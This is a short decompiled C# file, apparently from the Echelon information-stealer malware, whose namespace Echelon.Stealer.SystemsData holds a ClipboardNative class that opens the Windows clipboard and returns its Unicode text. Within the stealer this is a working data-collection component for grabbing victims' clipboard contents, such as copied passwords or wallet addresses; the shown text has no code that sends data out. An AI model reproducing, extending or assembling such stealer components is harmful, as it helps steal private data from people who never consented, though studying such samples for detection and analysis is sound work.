using System;
using System.Runtime.InteropServices;
using Echelon.Global;

namespace Echelon.Stealer.SystemsData
{
	// Token: 0x02000022 RID: 34
	internal static class ClipboardNative
	{
		// Token: 0x06000082 RID: 130 RVA: 0x0001B148 File Offset: 0x00019348
		public static string GetText()
		{
			if (NativeMethods.IsClipboardFormatAvailable(13U) && NativeMethods.OpenClipboard(IntPtr.Zero))
			{
				string result = string.Empty;
				IntPtr clipboardData = NativeMethods.GetClipboardData(13U);
				if (!clipboardData.Equals(IntPtr.Zero))
				{
					IntPtr intPtr = NativeMethods.GlobalLock(clipboardData);
					if (!intPtr.Equals(IntPtr.Zero))
					{
						try
						{
							result = Marshal.PtrToStringUni(intPtr);
							NativeMethods.GlobalUnlock(intPtr);
						}
						catch
						{
						}
					}
				}
				NativeMethods.CloseClipboard();
				return result;
			}
			return null;
		}

		// Token: 0x04000063 RID: 99
		private const uint CF_UNICODETEXT = 13U;
	}
}
